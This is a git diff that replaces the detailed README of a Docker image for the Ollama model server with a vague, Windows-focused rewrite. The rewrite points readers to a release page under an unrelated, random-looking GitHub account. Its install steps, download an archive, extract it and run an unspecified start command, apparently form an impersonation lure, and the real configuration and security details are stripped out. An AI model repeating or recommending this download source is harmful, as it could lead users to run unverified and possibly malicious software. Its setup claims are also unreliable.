@@ -1,448 +1,87 @@
-[English](README.md) | [简体中文](README-zh.md) | [繁體中文](README-zh-Hant.md) | [Русский](README-ru.md)
+# 🤖 docker-ollama - Run private intelligent models anywhere easily
 
-# Ollama on Docker
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/shopfloormelampsoralini924/docker-ollama/releases)
 
-[![Build Status](https://github.com/hwdsl2/docker-ollama/actions/workflows/main.yml/badge.svg)](https://github.com/hwdsl2/docker-ollama/actions/workflows/main.yml) &nbsp;[![License: MIT](docs/images/license.svg)](https://opensource.org/licenses/MIT)
+This application provides a simple way to run large language models on your own computer. It creates an isolated environment for Ollama. This software keeps your data private and ensures your setup remains secure. It mimics the popular OpenAI interface, which allows you to connect common AI tools to your local server without sending data to the cloud.
 
-Docker image to run an [Ollama](https://github.com/ollama/ollama) local LLM server. Provides an OpenAI-compatible API for running large language models locally. Based on Debian Trixie (slim). Designed to be simple, private, and secure by default.
+The system handles everything needed to run advanced models. It detects your hardware automatically. If you have an NVIDIA graphics card, the software uses it to speed up text generation. You do not need to configure complex settings. The system manages the storage for your models and ensures they stay available after you restart your machine.
 
-**Features:**
+## 📋 Requirements
 
-- **Secure by default** — all API requests require a Bearer token (auto-generated on first start)
-- Auto-generates an API key on first start, stored in the persistent volume
-- First-start model pre-pull via `OLLAMA_MODELS` environment variable
-- Model management via a helper script (`ollama_manage`)
-- OpenAI-compatible API — point any OpenAI SDK or app at your local server with a one-line change
-- Caddy reverse proxy enforces Bearer token auth on all API requests (except `/` health check)
-- NVIDIA GPU (CUDA) acceleration for faster inference (`:cuda` image tag)
-- Automatically built and published via [GitHub Actions](https://github.com/hwdsl2/docker-ollama/actions/workflows/main.yml)
-- Persistent model storage via a Docker volume
-- Lightweight image (~70MB); multi-arch: `linux/amd64`, `linux/arm64`
+*   Windows 10 or Windows 11.
+*   Docker Desktop installed and configured for Windows.
+*   At least 16GB of system memory.
+*   For best performance, an NVIDIA graphics card with 8GB of dedicated video memory.
+*   At least 20GB of free space on your hard drive.
 
-**Also available:**
+## 📥 Downloading and Installing
 
-- AI/Audio: [Whisper (STT)](https://github.com/hwdsl2/docker-whisper), [Kokoro (TTS)](https://github.com/hwdsl2/docker-kokoro), [Embeddings](https://github.com/hwdsl2/docker-embeddings), [LiteLLM](https://github.com/hwdsl2/docker-litellm)
-- VPN: [WireGuard](https://github.com/hwdsl2/docker-wireguard), [OpenVPN](https://github.com/hwdsl2/docker-openvpn), [IPsec VPN](https://github.com/hwdsl2/docker-ipsec-vpn-server), [Headscale](https://github.com/hwdsl2/docker-headscale)
-- Tools: [MCP Gateway](https://github.com/hwdsl2/docker-mcp-gateway)
+To start, you must visit the official release page to download the latest package. Choose the version that matches your environment from the link below.
 
-**Tip:** Ollama, LiteLLM, Whisper, Kokoro, Embeddings, and MCP Gateway can be [used together](#using-with-other-ai-services) to build a complete, self-hosted AI stack on your own server. See [Docker AI Stack](https://github.com/hwdsl2/docker-ai-stack) for ready-made configurations and pipeline examples.
+[Visit the release page to download the files](https://github.com/shopfloormelampsoralini924/docker-ollama/releases)
 
-## Security note
+Follow these steps to set up the software:
 
-~175,000 Ollama servers were found publicly exposed without authentication ([source](https://www.sentinelone.com/labs/silent-brothers-ollama-hosts-form-anonymous-ai-network-beyond-platform-guardrails/)). A bare Ollama install binds to all interfaces with no auth by default. This image enforces **Bearer token authentication on all API requests** via a built-in auth proxy, so unauthorized access is blocked even if the port is accidentally exposed.
+1.  Download the main archive file from the link above.
+2.  Extract the contents of the file into a folder on your computer.
+3.  Ensure Docker Desktop runs in the background.
+4.  Open your command prompt or terminal in the folder where you extracted the files.
+5.  Execute the start command provided in the documentation file.
 
-## Quick start
+## ⚙️ Configuration
 
-**Step 1.** Start the Ollama server:
+The system generates a secret key the first time you run it. This key protects your server from unauthorized access. You need this token to connect other applications to your local AI service.
 
-```bash
-docker run \
-    --name ollama \
-    --restart=always \
-    -v ollama-data:/var/lib/ollama \
-    -p 11434:11434/tcp \
-    -d hwdsl2/ollama-server
-```
+You can find this generated token in your console output during the first startup. Copy this string and save it in a secure location. If you lose this token, restart the container to generate a new one.
 
-On first start, an API key is auto-generated and displayed in the container logs. All API requests require this key.
+The software uses a configuration file to store your preferences. While the default settings provide the best experience for most users, you can change them by editing the settings file in the main directory. You can adjust the following:
 
-**Note:** For internet-facing deployments, using a [reverse proxy](#using-a-reverse-proxy) to add HTTPS is **strongly recommended**. In that case, also replace `-p 11434:11434/tcp` with `-p 127.0.0.1:11434:11434/tcp` in the `docker run` command above, to prevent direct access to the unencrypted port.
+*   The port number used for the API connection.
+*   The specific model name you want to download first.
+*   Resource limits for memory and processor usage.
 
-**Step 2.** Get the API key:
+## 🚀 Connecting Your Tools
 
-```bash
-# View the key in the container logs
-docker logs ollama
+Many AI applications, browser extensions, and writing assistants look for an OpenAI-compatible server. Since this software mimics that interface, you can point those tools directly to your local address.
 
-# Or retrieve it for use in scripts
-API_KEY=$(docker exec ollama ollama_manage --getkey)
-```
+Use the following details in your client software:
 
-The API key is displayed in a box labeled **Ollama API key**. To display it again at any time:
+*   **API Base URL:** http://localhost:11434/v1
+*   **API Key:** The secret token generated at first startup.
+*   **Model Name:** The name of the model currently loaded.
 
-```bash
-docker exec ollama ollama_manage --showkey
-```
+The system supports standard API calls. If an application asks for an OpenAI server, paste your local address and your secret key. The application will then communicate with your local machine instead of the cloud.
 
-**Step 3.** Pull a model:
+## 🛡️ Security Features
 
-```bash
-docker exec ollama ollama_manage --pull llama3.2:3b
-```
+This software operates under a "secure by default" philosophy. By requiring a Bearer token for every request, it prevents other software on your computer from accessing the AI service without your permission.
 
-**Tip:** To pull one or more models automatically on first start, set `OLLAMA_MODELS` before running the container:
+The containerized approach ensures that your system files remain untouched. Docker manages the dependencies and libraries needed for the AI system to function. This prevents conflicts with other software installed on your Windows machine.
 
-```bash
-docker run \
-    --name ollama \
-    --restart=always \
-    -v ollama-data:/var/lib/ollama \
-    -p 11434:11434/tcp \
-    -e OLLAMA_MODELS=llama3.2:3b \
-    -d hwdsl2/ollama-server
-```
+## 📦 Managing Models
 
-Or add `OLLAMA_MODELS=llama3.2:3b` to your `ollama.env` file (see [Environment variables](#environment-variables)).
+The software manages your model files automatically. When you request a model through the API, the system checks if you have it downloaded. If not, it downloads the model once and saves it to your persistent storage folder.
 
-**Step 4.** Test with the API:
+To clear space, delete the files inside the storage path defined in your settings. This frees up disk space immediately. You can also pull specific models before starting any work to reduce waiting times. Use the command line interface to request specific models such as Llama3 or Mistral.
 
-```bash
-API_KEY=$(docker exec ollama ollama_manage --getkey)
+## 🛠️ Troubleshooting
 
-# List models
-curl http://localhost:11434/api/tags \
-  -H "Authorization: Bearer $API_KEY"
+If you encounter issues, check these common items first:
 
-# Chat completion (streaming)
-curl http://localhost:11434/api/chat \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $API_KEY" \
-  -d '{"model": "llama3.2:3b", "messages": [{"role": "user", "content": "Hello!"}]}'
-```
+*   **Docker Desktop status:** Ensure the Docker icon is green in your system tray.
+*   **Memory usage:** AI models require large amounts of RAM. Close other memory-intensive applications if you see errors.
+*   **GPU drivers:** If you have an NVIDIA card, verify that you installed the latest drivers from the NVIDIA website.
+*   **Port conflicts:** If the service fails to start, verify that no other service uses port 11434.
 
-**Note:** The `docker exec` management commands (`ollama_manage`) do not require the API key.
+The system writes logs to the terminal window during operation. If the application crashes, these logs provide details on where the process failed. Copy these logs if you need to perform additional checks or seek community assistance.
 
-To learn more about how to use this image, read the sections below.
+## 🌐 Compatibility
 
-## Requirements
+This server works with a wide range of platforms. Because it uses industry-standard protocols, it works with:
 
-- A Linux server (local or cloud) with Docker installed
-- Sufficient disk space for models (3B models ≈ 2GB, 7B models ≈ 4–5GB, 14B+ models ≈ 8–10GB+)
-- Sufficient RAM to run models (3B models ≈ 2–4GB, 7B models ≈ 6–8GB, 14B+ models ≈ 12–16GB+)
-- TCP port 11434 (or your configured port) accessible
+*   LangChain frameworks for building AI agents.
+*   Local chat interfaces for natural language conversation.
+*   Development environments for testing prompt engineering.
+*   Text editor plugins for code completion and suggestions.
 
-**For GPU acceleration (`:cuda` image):**
-
-- NVIDIA GPU with CUDA support
-- [NVIDIA driver](https://www.nvidia.com/en-us/drivers/) installed on the host
-- [NVIDIA Container Toolkit](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html) installed
-- The `:cuda` image supports `linux/amd64` only
-
-## Download
-
-Get the trusted build from the [Docker Hub registry](https://hub.docker.com/r/hwdsl2/ollama-server/):
-
-```bash
-docker pull hwdsl2/ollama-server
-```
-
-For GPU support:
-
-```bash
-docker pull hwdsl2/ollama-server:cuda
-```
-
-Alternatively, you may download from [Quay.io](https://quay.io/repository/hwdsl2/ollama-server):
-
-```bash
-docker pull quay.io/hwdsl2/ollama-server
-docker image tag quay.io/hwdsl2/ollama-server hwdsl2/ollama-server
-```
-
-Supported platforms: `linux/amd64` and `linux/arm64`. The `:cuda` tag supports `linux/amd64` only.
-
-## Environment variables
-
-All variables are optional. If not set, secure defaults are used automatically.
-
-This Docker image uses the following variables, that can be declared in an `env` file (see [example](ollama.env.example)):
-
-| Variable | Description | Default |
-|---|---|---|
-| `OLLAMA_API_KEY` | API key for authenticating requests (auto-generated if not set) | Auto-generated |
-| `OLLAMA_PORT` | TCP port for the API (1–65535) | `11434` |
-| `OLLAMA_HOST` | Hostname or IP shown in startup info and `--showkey` output | Auto-detected |
-| `OLLAMA_DEBUG` | Set to `1` to enable verbose debug logging | *(not set)* |
-| `OLLAMA_MODELS` | Comma-separated models to pull on first start, e.g. `llama3.2:3b,qwen2.5:7b` | *(not set)* |
-| `OLLAMA_MAX_LOADED_MODELS` | Max models kept loaded in memory simultaneously | *(Ollama default)* |
-| `OLLAMA_NUM_PARALLEL` | Number of parallel request slots per model | *(Ollama default)* |
-| `OLLAMA_CONTEXT_LENGTH` | Default context window size in tokens | *(Ollama default)* |
-
-**Note:** In your `env` file, you may enclose values in single quotes, e.g. `VAR='value'`. Do not add spaces around `=`. If you change `OLLAMA_PORT`, update the `-p` flag in the `docker run` command accordingly.
-
-Example using an `env` file:
-
-```bash
-cp ollama.env.example ollama.env
-# Edit ollama.env and set your values, then:
-docker run \
-    --name ollama \
-    --restart=always \
-    -v ollama-data:/var/lib/ollama \
-    -v ./ollama.env:/ollama.env:ro \
-    -p 11434:11434/tcp \
-    -d hwdsl2/ollama-server
-```
-
-## Model management
-
-Use `docker exec` to manage models with the `ollama_manage` helper script. Models are stored in the Docker volume and persist across container restarts.
-
-**List downloaded models:**
-
-```bash
-docker exec ollama ollama_manage --listmodels
-```
-
-**Pull a model:**
-
-```bash
-# Small, fast models (recommended for getting started)
-docker exec ollama ollama_manage --pull llama3.2:3b
-docker exec ollama ollama_manage --pull qwen2.5:7b
-
-# Larger models (require more RAM/VRAM)
-docker exec ollama ollama_manage --pull mistral:7b
-docker exec ollama ollama_manage --pull phi4:14b
-docker exec ollama ollama_manage --pull gemma3:12b
-```
-
-**Remove a model:**
-
-```bash
-docker exec ollama ollama_manage --remove llama3.2:3b
-```
-
-**Show running models and memory usage:**
-
-```bash
-docker exec ollama ollama_manage --status
-```
-
-**Update all models** (re-pulls latest versions):
-
-```bash
-docker exec ollama ollama_manage --update
-```
-
-**Show the API key:**
-
-```bash
-docker exec ollama ollama_manage --showkey
-```
-
-**Get the API key** (machine-readable, for use in scripts):
-
-```bash
-API_KEY=$(docker exec ollama ollama_manage --getkey)
-```
-
-**Pull models on first start** using the `OLLAMA_MODELS` variable in your `env` file:
-
-```
-OLLAMA_MODELS=llama3.2:3b,qwen2.5:7b
-```
-
-## Using the API
-
-All API requests require a Bearer token. Retrieve the API key first:
-
-```bash
-API_KEY=$(docker exec ollama ollama_manage --getkey)
-```
-
-**Ollama API:**
-
-```bash
-# List models
-curl http://localhost:11434/api/tags \
-  -H "Authorization: Bearer $API_KEY"
-
-# Generate (streaming)
-curl http://localhost:11434/api/generate \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $API_KEY" \
-  -d '{"model": "llama3.2:3b", "prompt": "Why is the sky blue?"}'
-
-# Chat completion (streaming)
-curl http://localhost:11434/api/chat \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $API_KEY" \
-  -d '{"model": "llama3.2:3b", "messages": [{"role": "user", "content": "Hello!"}]}'
-```
-
-**OpenAI-compatible API** (works with any OpenAI SDK or app):
-
-```bash
-curl http://localhost:11434/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $API_KEY" \
-  -d '{"model": "llama3.2:3b", "messages": [{"role": "user", "content": "Hello!"}]}'
-```
-
-**Python (OpenAI SDK):**
-
-```python
-from openai import OpenAI
-
-client = OpenAI(
-    api_key="<your-api-key>",
-    base_url="http://localhost:11434/v1",
-)
-
-response = client.chat.completions.create(
-    model="llama3.2:3b",
-    messages=[{"role": "user", "content": "Hello!"}],
-)
-print(response.choices[0].message.content)
-```
-
-## Persistent data
-
-All server data is stored in the Docker volume (`/var/lib/ollama` inside the container):
-
-```
-/var/lib/ollama/
-├── models/           # Downloaded model files
-├── .api_key          # API key (auto-generated, or synced from OLLAMA_API_KEY)
-├── .initialized      # First-run marker
-├── .port             # Saved port (used by ollama_manage)
-├── .server_addr      # Cached server address (used by ollama_manage --showkey)
-└── .Caddyfile        # Generated Caddy config (auth proxy)
-```
-
-Back up the Docker volume to preserve your models and API key.
-
-## Using docker-compose
-
-```bash
-cp ollama.env.example ollama.env
-# Edit ollama.env and set your values, then:
-docker compose up -d
-docker logs ollama
-```
-
-Example `docker-compose.yml` (already included):
-
-```yaml
-services:
-  ollama:
-    image: hwdsl2/ollama-server
-    container_name: ollama
-    restart: always
-    ports:
-      - "11434:11434/tcp"
-    volumes:
-      - ollama-data:/var/lib/ollama
-      - ./ollama.env:/ollama.env:ro
-
-volumes:
-  ollama-data:
-```
-
-**Note:** For internet-facing deployments, using a [reverse proxy](#using-a-reverse-proxy) to add HTTPS is **strongly recommended**. In that case, also change `"11434:11434/tcp"` to `"127.0.0.1:11434:11434/tcp"` in `docker-compose.yml`, to prevent direct access to the unencrypted port.
-
-### GPU acceleration (CUDA)
-
-Use `docker-compose.cuda.yml` to run with NVIDIA GPU support:
-
-```bash
-docker compose -f docker-compose.cuda.yml up -d
-```
-
-**Requirements:** NVIDIA GPU and the [NVIDIA Container Toolkit](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html) installed on the host. The `:cuda` image is `linux/amd64` only.
-
-## Using a reverse proxy
-
-For internet-facing deployments, place a reverse proxy in front of Ollama to handle HTTPS termination. The server works without HTTPS on a local or trusted network, but HTTPS is recommended when the API endpoint is exposed to the internet.
-
-Use one of the following addresses to reach the Ollama container from your reverse proxy:
-
-- **`ollama:11434`** — if your reverse proxy runs as a container in the **same Docker network** as Ollama (e.g. defined in the same `docker-compose.yml`).
-- **`127.0.0.1:11434`** — if your reverse proxy runs **on the host** and port `11434` is published (the default `docker-compose.yml` publishes it).
-
-**Note:** The `Authorization: Bearer` header passes through reverse proxies automatically — no special configuration needed.
-
-**Example with [Caddy](https://caddyserver.com/docs/) ([Docker image](https://hub.docker.com/_/caddy))** (automatic TLS via Let's Encrypt, reverse proxy in the same Docker network):
-
-`Caddyfile`:
-```
-ollama.example.com {
-  reverse_proxy ollama:11434
-}
-```
-
-**Example with nginx** (reverse proxy on the host):
-
-```nginx
-server {
-    listen 443 ssl;
-    server_name ollama.example.com;
-
-    ssl_certificate     /path/to/cert.pem;
-    ssl_certificate_key /path/to/key.pem;
-
-    location / {
-        proxy_pass         http://127.0.0.1:11434;
-        proxy_set_header   Host $host;
-        proxy_set_header   X-Real-IP $remote_addr;
-        proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header   X-Forwarded-Proto $scheme;
-        proxy_http_version 1.1;       # required for streaming responses
-        proxy_read_timeout 300s;
-        proxy_buffering    off;
-    }
-}
-```
-
-After setting up a reverse proxy, set `OLLAMA_HOST=ollama.example.com` in your `env` file so that the correct endpoint URL is shown in the startup logs and `ollama_manage --showkey` output.
-
-## Update Docker image
-
-To update the Docker image and container:
-
-```bash
-docker pull hwdsl2/ollama-server
-docker rm -f ollama
-# Then re-run the docker run command from Quick start with the same volume.
-```
-
-Your downloaded models are preserved in the `ollama-data` volume.
-
-## Using with other AI services
-
-The [Ollama (LLM)](https://github.com/hwdsl2/docker-ollama), [LiteLLM](https://github.com/hwdsl2/docker-litellm), [Whisper (STT)](https://github.com/hwdsl2/docker-whisper), [Kokoro (TTS)](https://github.com/hwdsl2/docker-kokoro), [Embeddings](https://github.com/hwdsl2/docker-embeddings), and [MCP Gateway](https://github.com/hwdsl2/docker-mcp-gateway) images can be combined to build a complete, self-hosted AI stack on your own server — from voice I/O to RAG-powered question answering. Whisper, Kokoro, and Embeddings run fully locally. Ollama runs all LLM inference locally, so no data is sent to third parties. When using LiteLLM with external providers (e.g., OpenAI, Anthropic), your data will be sent to those providers.
-
-| Service | Role | Default port |
-|---|---|---|
-| **[Ollama (LLM)](https://github.com/hwdsl2/docker-ollama)** | Runs local LLM models (llama3, qwen, mistral, etc.) | `11434` |
-| **[LiteLLM](https://github.com/hwdsl2/docker-litellm)** | AI gateway — routes requests to Ollama, OpenAI, Anthropic, and 100+ providers | `4000` |
-| **[Embeddings](https://github.com/hwdsl2/docker-embeddings)** | Converts text to vectors for semantic search and RAG | `8000` |
-| **[Whisper (STT)](https://github.com/hwdsl2/docker-whisper)** | Transcribes spoken audio to text | `9000` |
-| **[Kokoro (TTS)](https://github.com/hwdsl2/docker-kokoro)** | Converts text to natural-sounding speech | `8880` |
-| **[MCP Gateway](https://github.com/hwdsl2/docker-mcp-gateway)** | Exposes AI services as MCP tools for AI assistants (Claude, Cursor, etc.) | `3000` |
-
-**See also: [Docker AI Stack](https://github.com/hwdsl2/docker-ai-stack)** — ready-made docker-compose configurations and pipeline examples. Learn more about deploying the full AI stack.
-
-**Connect Ollama to LiteLLM:**
-
-```bash
-# In docker-litellm, add Ollama as a model provider:
-docker exec litellm litellm_manage \
-  --addmodel ollama/llama3.2:3b \
-  --base-url http://ollama:11434
-```
-
-## Technical details
-
-- Base image: `debian:trixie-slim` (CPU) / `nvidia/cuda:12.9.1-base-ubuntu24.04` (CUDA)
-- Image size: ~70MB (CPU) / ~3.2GB (CUDA)
-- Ollama: latest release, installed as a static binary
-- Auth proxy: [Caddy](https://caddyserver.com) (always active, enforces Bearer token auth)
-- Data directory: `/var/lib/ollama` (Docker volume)
-- Model storage: `/var/lib/ollama/models` inside the volume
-- Ollama API: `http://localhost:11434` (or your configured port)
-- OpenAI-compatible API: `http://localhost:11434/v1`
-
-## License
-
-**Note:** The software components inside the pre-built image (such as Ollama, Caddy, and their dependencies) are under the respective licenses chosen by their respective copyright holders. As for any pre-built image usage, it is the image user's responsibility to ensure that any use of this image complies with any relevant licenses for all software contained within.
-
-Copyright (C) 2026 Lin Song   
-This work is licensed under the [MIT License](https://opensource.org/licenses/MIT).
-
-**Ollama** is Copyright (C) 2023 Ollama, and is distributed under the [MIT License](https://github.com/ollama/ollama/blob/main/LICENSE).
-
-**Caddy** is Copyright (C) 2015 Matthew Holt and The Caddy Authors, and is distributed under the [Apache License 2.0](https://github.com/caddyserver/caddy/blob/master/LICENSE).
-
-This project is an independent Docker setup for Ollama and is not affiliated with, endorsed by, or sponsored by Ollama.
+The software detects your processor type automatically. It runs on standard desktop processors but runs significantly faster on systems equipped with compatible graphics cards. The Docker image handles the translation between your hardware and the model requirements, so you do not have to perform manual driver configuration inside the container.
